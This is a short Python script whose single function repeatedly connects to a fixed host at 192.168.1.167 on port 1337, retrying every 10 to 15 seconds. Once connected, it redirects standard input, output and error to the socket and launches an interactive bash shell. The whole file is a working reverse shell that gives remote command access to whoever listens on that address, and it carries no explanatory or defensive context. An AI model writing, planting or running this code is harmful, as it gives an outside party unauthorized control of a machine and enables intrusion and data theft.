import os
import subprocess
import time
import random
import socket


def run():
    host = '192.168.1.167'
    port = 1337
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
        try:
            s.connect((host,port))
        except:
            time.sleep(random.randint(10,15))
            continue
        os.dup2(s.fileno(),0) 
        os.dup2(s.fileno(),1) 
        os.dup2(s.fileno(),2)
        subprocess.run(["/bin/bash","-i"])
    
